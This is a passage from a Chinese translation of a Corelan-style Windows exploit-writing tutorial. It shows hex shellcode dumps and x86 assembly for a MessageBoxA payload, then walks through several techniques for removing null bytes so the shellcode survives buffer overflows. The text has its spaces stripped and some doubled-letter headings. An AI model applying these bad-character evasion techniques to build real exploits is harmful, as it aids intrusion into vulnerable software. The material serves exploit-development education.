print"Read".$offset."bytes\n\n";
my$cnt=0;
my$nullbyte=0;
printchr(34);
for($i=0;$i>4)&0x0f);
$str2=sprintf("%01x",ord($c)&0x0f);
if($cntpveReadbin.plmsgbox.bin
Readingmsgbox.bin
Read78bytes
"\x68\x6c\x61\x6e\x00\x68\x43\x6f"
"\x72\x65\x89\xe3\x68\x61\x6e\x20"
"\x00\x68\x6f\x72\x65\x6c\x68\x62"
"\x79\x20\x43\x68\x6e\x65\x64\x20"
"\x68\x6e\x20\x70\x77\x68\x20\x62"
"\x65\x65\x68\x68\x61\x76\x65\x68"
"\x59\x6f\x75\x20\x89\xe1\x31\xc0"
"\x50\x53\x51\x50\x50\xbe\xea\x07"
"\x45\x7e\xff\xe6\x31\xc0\x50\xb8"
"\x12\xcb\x81\x7c\xff\xe0";
Numberofnullbytes:2
把这个代码复制到C程序“shellcodetest”中，编译运行：
哈--好的--这个简单多了。
从这里往教程前面看，我们会继续直接用汇编代码写我们的shellcode。如果你感觉上面
的汇编代码很难懂，那就先停下来返回前面。上面用到的汇编语言是很基本的，它不需要我
们花很长时间就能懂它是干什么的。
处理 nnnnuuuullllllll字节
当你往回看产生的字节码，我们注意到他们都包含null字节。当你在溢出一个缓冲区时，
null字节将会成为一个问题，null字节将会阻断字符串。因此shellcode的主要要求是要避免
null字节的产生。
有很多方法处理null字节：你可以找其他的指令来代替来避免代码中的null字节，重新
产生原始值，用编码器，等等。
可替代指令&&&&指令编码
在我们的例子的一个特定点，我们必须把eax置为0。我们可以用moveax,0来实现，但
是这会生成下面的机器码“\xc7\xc0\x00\x00\x00\x00”。为了避免这个，我们用“xoreax,eax”
代替。这个产生相同的结果并且机器码里不含null字节。因此避免null字节的一种方法是
找能够产生相同结果的指令来代替。
在我们的例子里，有两个null字节，是由要入栈的字符串的结束符产生的。为了替代将
null字节入栈这条指令，我们可以在栈上生成null字节而不是用null字节入栈。
这是一个编码器是干什么用的基本例子。它会动态产生原始的值/机器码，同时避免了一
些特定的字节如null字节。
有两种方法来处理null字节的问题：我们也可以写些基本的指令来处理2个null字节（用
不同的指令也可以达到同样的效果），或者将整个shellcode编码。
我们将会在下一章讨论payload编码器（将整个shellcode编码），我们先看手工的指令编
码。
我们的例子有2个指令包含null字节：
"\x68\x6c\x61\x6e\x00" 和"\x68\x61\x6e\x20\x00"
我们要怎样实现相同的结果但是在字节码不用到null字节？
方案1111：用aaaadddddddd&&&&ssssuuuubbbb来重新产生原来的值
假使我们从006E616C 减去11111111（=EF5D505B），将结果写入 EBX，把 EBX 加上
11111111，然后将它写入栈中？没有null字节，并且能实现我们想要的。
因此，我们这样做：
将EF5D505B放到EBX中
将EBX加上11111111
将ebx入栈
对其他null字节做相同的操作（用ECX做寄存器）
用汇编：
[BITS32]
XOREAX,EAX
MOVEBX,0xEF5D505B
ADDEBX,0x11111111 ;add11111111
;EBXnowcontainslastpartof"Corelan"
PUSHEBX ;pushittothestack
PUSH0x65726f43
MOVEBX,ESP ;savepointerto"Corelan"inEBX
;push"YouhavebeenpwnedbyCorelan"
MOVECX,0xEF0F5D50
ADDECX,0x11111111
PUSHECX
PUSH0x6c65726f
PUSH0x43207962
PUSH0x2064656e
PUSH0x7770206e
PUSH0x65656220
PUSH0x65766168
PUSH0x20756f59
MOVECX,ESP ;savepointerto"Youhavebeen..."inECX
PUSHEAX ;putparametersonthestack
PUSHEBX
PUSHECX
PUSHEAX
PUSHEAX
MOVESI,0x7E4507EA
JMPESI ;MessageBoxA
XOREAX,EAX ;cleanup
PUSHEAX
MOVEAX,0x7c81CB12
JMPEAX ;ExitProcess(0)
当然，这增加了shellcode的大小，但是至少我们不要用null字节。
将asm文件编译后，并将里面的字节从bin文件中提取出来，我们得到这个：
C:\shellcode>perlpveReadbin.plmsgbox2.bin
Readingmsgbox2.bin
Read92bytes
"\x31\xc0\xbb\x5b\x50\x5d\xef\x81"
"\xc3\x11\x11\x11\x11\x53\x68\x43"
"\x6f\x72\x65\x89\xe3\xb9\x50\x5d"
"\x0f\xef\x81\xc1\x11\x11\x11\x11"
"\x51\x68\x6f\x72\x65\x6c\x68\x62"
"\x79\x20\x43\x68\x6e\x65\x64\x20"
"\x68\x6e\x20\x70\x77\x68\x20\x62"
"\x65\x65\x68\x68\x61\x76\x65\x68"
"\x59\x6f\x75\x20\x89\xe1\x50\x53"
"\x51\x50\x50\xbe\xea\x07\x45\x7e"
"\xff\xe6\x31\xc0\x50\xb8\x12\xcb"
"\x81\x7c\xff\xe0";
Numberofnullbytes:0
为了证明它成功了，我们将会将这个自定义的shellcode放到一个常规的exploit中，（在XP
SP3，一个已经加载了user32.dll的应用程序）...举个例子，如“EasyRMtoMP3Converter”
（记得教程1？）
一个相似的技术（这里解释的那个）用在了编码器中...如果你将这种技术扩展，它就能用在
重新生成整个payload中，并且你可以将字符集限制在字母数字混合编制的字符（举个例子）。
一个很好的能表达我的意思的例子能在教程8中找到。
还有很多克服null字节的技术：
方案2222：ssssnnnniiiippppeeeerrrr::::pppprrrreeeecccciiiissssiiiioooonnnn----nnnnuuuullllllll----bbbbyyyytttteeee----bbbboooommmmiiiinnnngggg
第二种能够克服shellcode中null字节问题的技术是这样的：
将当前的栈顶位置放到ebp中
将一个寄存器置为0
将没有null字节的值写入堆栈（将null字节用其它的东西代替）
将那个字节用null字节覆盖掉，用那个已经置为0的寄存器，然后指向一个ebp的负偏
移量地址处。用负偏移量将产生\xff字节（而不是\x00字节），所以绕过null字节的限制。
[BITS32]
XOREAX,EAX ;setEAXtozero
MOVEBP,ESP ;setEBPtoESPsowecanusenegativeoffset
PUSH0xFF6E616C;pushpartofstringtostack
MOV[EBP-1],AL ;overwriteFFwith00
PUSH0x65726f43;pushrestofstringtostack
MOVEBX,ESP ;savepointerto"Corelan"inEBX
PUSH0xFF206E61;pushpartofstringtostack
MOV[EBP-9],AL ;overwriteFFwith00
PUSH0x6c65726f;pushrestofstringtostack
PUSH0x43207962
PUSH0x2064656e
PUSH0x7770206e
PUSH0x65656220
PUSH0x65766168
PUSH0x20756f59
MOVECX,ESP ;savepointerto"Youhavebeen..."inECX
PUSHEAX ;putparametersonthestack
PUSHEBX
PUSHECX
PUSHEAX
PUSHEAX
MOVESI,0x7E4507EA
JMPESI ;MessageBoxA
XOREAX,EAX ;cleanup
PUSHEAX
MOVEAX,0x7c81CB12
JMPEAX ;ExitProcess(0)
方案3333：将原始值一字节一字节写入
这种技术用到的理念和方案2的一样，但是我们是在栈上写入null字节（xoreax,eax+push
eax)，而不是将null字节替代掉后再回写，然后通过在ebp的负偏移量处一字节一字节写入，
重新产生没有null字节的机器码。
将当前栈顶位置放到ebp中
将null字节写入栈中（xoreax,eax和pusheax）
将没有null字节的写入到栈基址指针（ebp）的负偏移量的准确位置处
例子：
[BITS32]
XOREAX,EAX ;setEAXtozero
MOVEBP,ESP ;setEBPtoESPsowecanusenegativeoffset
PUSHEAX
MOVBYTE[EBP-2],6Eh ;
MOVBYTE[EBP-3],61h ;
MOVBYTE[EBP-4],6Ch ;
PUSH0x65726f43;pushrestofstringtostack
MOVEBX,ESP ;savepointerto"Corelan"inEBX
很明显上两个技术都会产生对shellcode大小的负面影响，但是它们能很好的工作。
方案4444：xxxxoooorrrr
另一个技术是写入特定值到2个寄存器中，当用xor对这两个寄存器操作后，它将会产
生我们所期望的值。
因此我们要把0x006E616C写入栈中，你可以这样做：
打开windows计算器并将模式设为十六进制
打入777777FF
按XOR
打入006E616C
结果：77191693
现在将每个值（777777FF和77191693）放到2个寄存器中，将它们异或，并将结果入栈：
[BITS32]